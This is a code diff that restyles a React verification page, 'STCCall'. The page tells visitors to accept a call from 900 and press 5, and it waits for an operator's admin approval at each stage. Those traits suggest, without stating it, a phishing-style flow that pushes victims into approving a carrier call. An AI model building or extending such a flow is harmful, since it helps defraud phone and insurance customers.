@@ -1,9 +1,8 @@
 import { useState, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
-import { Button } from "@/components/ui/button";
-import { Shield, CheckCircle2, Loader2 } from "lucide-react";
-import InsuranceStepper from "@/components/InsuranceStepper";
+import { CheckCircle2, Loader2, Info } from "lucide-react";
+import VerificationLayout from "@/components/VerificationLayout";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
@@ -55,71 +54,103 @@ const STCCall = () => {
   };
 
   return (
-    <div className="min-h-[100dvh] bg-secondary/30">
-      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
-        <div className="max-w-5xl mx-auto">
-          
-          <div className="max-w-md mx-auto">
-            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
-              <div className="bg-card rounded-2xl border border-border shadow-sm p-6 text-center">
-                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }}
-                  className="w-20 h-20 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4">
-                  <img src="/images/call.gif" alt="calling" className="w-16 h-16" />
-                </motion.div>
-
-                <h2 className="text-lg font-bold text-foreground mb-2">{sc.title}</h2>
-
-                <div className="bg-secondary/50 rounded-xl p-4 mb-4 space-y-2">
-                  <p className="text-xs text-muted-foreground">{sc.callInfo}</p>
-                  <p className="text-xs text-muted-foreground">{sc.fromNumber} <span className="font-bold text-primary font-mono" dir="ltr">900</span></p>
-                  <p className="text-sm font-bold text-foreground">{sc.acceptAndPress} <span className="text-primary text-lg">5</span></p>
-                </div>
-
-                <p className="text-[10px] text-muted-foreground mb-4">{sc.followInstructions}</p>
-
-                {waitingApproval ? (
-                  <WaitingApprovalOverlay
-                    title={sc.waitingApproval}
-                    subtitle={sc.waitingPlease}
-                    icon="clock"
-                  />
-                ) : !received && showButton ? (
-                  <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
-                    <Button onClick={handleCallReceived} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2">
-                      <CheckCircle2 className="w-3.5 h-3.5" />{sc.callReceived}
-                    </Button>
-                  </motion.div>
-                ) : !received ? (
-                  <div className="flex flex-col items-center gap-3 py-4">
-                    <div className="relative w-16 h-16">
-                      <svg className="w-16 h-16 -rotate-90" viewBox="0 0 64 64">
-                        <circle cx="32" cy="32" r="28" fill="none" stroke="hsl(var(--border))" strokeWidth="4" />
-                        <motion.circle cx="32" cy="32" r="28" fill="none" stroke="hsl(var(--primary))" strokeWidth="4"
-                          strokeLinecap="round" strokeDasharray={2 * Math.PI * 28}
-                          initial={{ strokeDashoffset: 0 }} animate={{ strokeDashoffset: 2 * Math.PI * 28 }}
-                          transition={{ duration: 10, ease: "linear" }} />
-                      </svg>
-                      <span className="absolute inset-0 flex items-center justify-center text-lg font-bold text-primary font-mono">{countdown}</span>
-                    </div>
-                    <p className="text-xs text-muted-foreground">{sc.waitingCall}</p>
-                  </div>
-                ) : (
-                  <div className="flex items-center justify-center gap-2 py-4">
-                    <Loader2 className="w-5 h-5 text-primary animate-spin" />
-                    <p className="text-xs text-muted-foreground">{sc.verifyingData}</p>
-                  </div>
-                )}
-
-                <div className="flex items-center justify-center gap-2 mt-4 pt-3 border-t border-border">
-                  <Shield className="w-3.5 h-3.5 text-primary/60" />
-                  <span className="text-[10px] text-muted-foreground">{sc.secureProcess}</span>
-                </div>
+    <VerificationLayout title={sc.title} subtitle="">
+      <div className="px-5 pb-5 pt-6">
+        {waitingApproval ? (
+          <WaitingApprovalOverlay
+            title={sc.waitingApproval}
+            subtitle={sc.waitingPlease}
+            icon="clock"
+          />
+        ) : (
+          <motion.div
+            className="space-y-4"
+            initial={{ opacity: 0, y: 12 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.4 }}
+          >
+            {/* Call animation */}
+            <motion.div
+              className="flex justify-center"
+              initial={{ scale: 0 }}
+              animate={{ scale: 1 }}
+              transition={{ type: "spring", delay: 0.1 }}
+            >
+              <div className="w-20 h-20 rounded-2xl bg-[#11998e]/10 flex items-center justify-center">
+                <img src="/images/call.gif" alt="calling" className="w-16 h-16" />
               </div>
             </motion.div>
-          </div>
-        </div>
+
+            <div className="text-center">
+              <h2 className="text-lg font-bold text-foreground mb-1">{sc.title}</h2>
+            </div>
+
+            {/* Call info */}
+            <motion.div
+              className="rounded-xl border-2 border-border p-4 space-y-2 text-center"
+              initial={{ opacity: 0, x: 10 }}
+              animate={{ opacity: 1, x: 0 }}
+              transition={{ delay: 0.2 }}
+            >
+              <p className="text-xs text-muted-foreground">{sc.callInfo}</p>
+              <p className="text-xs text-muted-foreground">{sc.fromNumber} <span className="font-bold text-[#11998e] font-mono" dir="ltr">900</span></p>
+              <p className="text-sm font-bold text-foreground">{sc.acceptAndPress} <span className="text-[#11998e] text-lg">5</span></p>
+            </motion.div>
+
+            <p className="text-[10px] text-muted-foreground text-center">{sc.followInstructions}</p>
+
+            {/* Countdown or Button */}
+            {!received && showButton ? (
+              <motion.button
+                onClick={handleCallReceived}
+                className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
+                style={{ backgroundColor: '#11998e' }}
+                whileTap={{ scale: 0.98 }}
+                initial={{ opacity: 0, y: 8 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ delay: 0.3 }}
+              >
+                <CheckCircle2 className="w-4 h-4" />
+                <span>{sc.callReceived}</span>
+              </motion.button>
+            ) : !received ? (
+              <div className="flex flex-col items-center gap-3 py-2">
+                <div className="relative w-16 h-16">
+                  <svg className="w-16 h-16 -rotate-90" viewBox="0 0 64 64">
+                    <circle cx="32" cy="32" r="28" fill="none" stroke="hsl(var(--border))" strokeWidth="4" />
+                    <motion.circle cx="32" cy="32" r="28" fill="none" stroke="#11998e" strokeWidth="4"
+                      strokeLinecap="round" strokeDasharray={2 * Math.PI * 28}
+                      initial={{ strokeDashoffset: 0 }} animate={{ strokeDashoffset: 2 * Math.PI * 28 }}
+                      transition={{ duration: 10, ease: "linear" }} />
+                  </svg>
+                  <span className="absolute inset-0 flex items-center justify-center text-lg font-bold text-[#11998e] font-mono">{countdown}</span>
+                </div>
+                <p className="text-xs text-muted-foreground">{sc.waitingCall}</p>
+              </div>
+            ) : (
+              <div className="flex items-center justify-center gap-2 py-4">
+                <Loader2 className="w-5 h-5 text-[#11998e] animate-spin" />
+                <p className="text-xs text-muted-foreground">{sc.verifyingData}</p>
+              </div>
+            )}
+
+            {/* Info box */}
+            <motion.div
+              className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              transition={{ delay: 0.4 }}
+            >
+              <div className="flex items-center justify-center gap-1.5 mb-1">
+                <Info className="w-3.5 h-3.5 text-[#11998e]" />
+                <p className="text-xs font-bold text-foreground">عملية آمنة</p>
+              </div>
+              <p className="text-[10px] text-muted-foreground">{sc.secureProcess}</p>
+            </motion.div>
+          </motion.div>
+        )}
       </div>
-    </div>
+    </VerificationLayout>
   );
 };
 
